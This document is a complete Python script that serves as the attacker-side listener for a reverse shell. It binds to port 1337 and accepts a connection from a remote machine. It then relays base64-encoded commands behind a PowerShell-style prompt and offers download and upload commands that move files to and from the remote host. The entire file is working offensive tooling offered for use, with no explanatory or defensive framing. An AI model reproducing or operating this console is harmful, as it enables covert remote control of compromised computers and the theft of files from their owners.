#!/usr/bin/python3


import argparse
from base64 import b64decode, b64encode
from cmd import Cmd
from json import dumps, JSONDecodeError, loads
import logging
from os.path import getsize, isdir, join
from ntpath import basename
import socket
import sys

from alive_progress import alive_bar
from colorama import Fore, init


class Packet():

    def __init__(self):
        self.action = 'cmd'
        self._args = {}
        self.message = None
        self.warning = None
        self.error = None
        self.path = None

    def add_argument(self, name, value):
        self._args[name] = value

    def dumps(self):
        return dumps({'action': self.action, 'args': self._args})

    def get_argument(self, name):
        return self._args.get(name)

    @staticmethod
    def loads(data):
        p = Packet()
        data = loads(data)
        p.action = data.get('action', '')
        p._args = data.get('args', {})
        p.message = b64decode(data.get('message', '')).decode('utf-8')
        p.warning = b64decode(data.get('warning', '')).decode('utf-8')
        p.error = b64decode(data.get('error', '')).decode('utf-8')
        p.cwd = b64decode(data.get('cwd', '')).decode('utf-8')
        return p


class Prompt(Cmd):
    intro = ''
    prompt = ''

    def __init__(self, client_sock):
        super().__init__()
        self.task_args = None
        self.sock = client_sock
        self.receive_loop()

    def do_download(self, line):
        parser = argparse.ArgumentParser(prog='download',
            description='Download file from remote host')
        parser.add_argument('file', type=str,
            help='Path to the file on the remote host')
        parser.add_argument('-d', '--destination', type=str, default='.',
            help='Destination of the downloaded file')
        try:
            args = parser.parse_args(line.split(' '))
        except SystemExit:
            return

        if not line:
            parser.print_usage()
            return

        self.task_args = args

        p = Packet()
        p.action = 'download'
        p.add_argument('path', args.file)
        self.send_packet(p)
        return self.receive_loop()

    def do_exit(self, line=''):
        self.sock.shutdown(socket.SHUT_RDWR)
        self.sock.close()
        return True

    def do_upload(self, line):
        parser = argparse.ArgumentParser(prog='upload',
            description='Upload file to remote host')
        parser.add_argument('file', type=str,
            help='Path to the file to upload')
        parser.add_argument('-d', '--destination', type=str, default='.',
            help='Destination of the uploaded file')
        try:
            args = parser.parse_args(line.split(' '))
        except SystemExit:
            return

        if not line:
            parser.print_usage()
            return

        self.task_args = args

        p = Packet()
        p.action = 'upload'

        try:
            p.add_argument('size', getsize(args.file))
        except OSError as e:
            self.print_error(str(e))
            return

        p.add_argument('dest', args.destination)
        p.add_argument('filename', basename(args.file))
        self.send_packet(p)
        return self.receive_loop()

    def default(self, line):
        p = Packet()
        p.add_argument('cmd', b64encode(line.encode('utf-8')).decode('utf-8'))
        self.send_packet(p)
        return self.receive_loop()

    def handle_default(self, packet):
        if packet.message:
            self.print_message(packet.message)
        if packet.warning:
            self.print_warning(packet.warning)
        if packet.error:
            self.print_error(packet.error)

    def handle_download(self, packet):
        if packet.error:
            self.print_error(packet.error)
            return

        file_size = packet.get_argument('size')
        received_bytes = 0
        
        if isdir(self.task_args.destination):
            file_path = join(self.task_args.destination,
                basename(self.task_args.file))
        else:
            file_path = self.task_args.destination

        self.sock.send(b'GO')
        with alive_bar(file_size) as bar:
            with open(file_path, 'wb') as f:
                while received_bytes < file_size:
                    data = self.sock.recv(1024)
                    if not data:
                        return self.do_exit()

                    f.write(data)
                    received_bytes += len(data)
                    bar(incr=len(data))

        self.print_message('File successfully saved to {}'.format(file_path))

    def handle_upload(self, packet):
        if packet.error:
            self.print_error(packet.error)
            return

        file_size = getsize(self.task_args.file)

        with alive_bar(file_size) as bar:
            with open(self.task_args.file, 'rb') as f:
                while True:
                    data = f.read(1024)
                    if not data:
                        return self.do_exit()
                    self.sock.send(data)
                    bar(incr=len(data))

        self.print_message('File successfully uploaded')

    @staticmethod
    def print_color(text, color):
        end = '' if text.endswith('\n') else '\n'
        print(color + text + Fore.RESET, end=end, flush=True)

    def print_error(self, text):
        self.print_color(text, Fore.RED)

    def print_message(self, text):
        self.print_color(text, Fore.RESET)

    def print_warning(self, text):
        self.print_color(text, Fore.YELLOW)

    def receive_loop(self):
        response = ''
        while True:
            data = self.sock.recv(1024)
            if not data:
                return self.do_exit()

            response += data.decode('utf-8')
            try:
                p = Packet.loads(response)
            except JSONDecodeError as e:
                continue
            except Exception as e:
                print('An unexcepted error happened:', e)
                return

            break

        try:
            f = getattr(self, 'handle_' + p.action)
        except AttributeError:
            f = getattr(self, 'handle_default')

        if p.cwd:
            self.prompt = 'PS {}> '.format(p.cwd)
        return f(p)

    def send_packet(self, packet):
        self.sock.send(packet.dumps().encode('utf-8'))


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Listen for incoming connections')
    parser.add_argument('-H', '--host', type=str, default='0.0.0.0',
        help='Local hostname or IP address to bind to (default: 0.0.0.0)')
    parser.add_argument('-p', '--port', type=int, default=1337,
        help='Local port to bind to (default: 1337)')
    args = parser.parse_args()

    init()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_address = (args.host, args.port)
    sock.bind(server_address)

    try:
        sock.listen()
        print('Listening on {}:{}'.format(*server_address))
        client_socket, client_address = sock.accept()
        print('Received connection from {}:{}\n'.format(*client_address))
        prompt = Prompt(client_socket)
        prompt.cmdloop()
    except Exception as e:
        client_socket.shutdown(socket.SHUT_RDWR)
        client_socket.close()
        raise
    finally:
        sock.shutdown(socket.SHUT_RDWR)
        sock.close()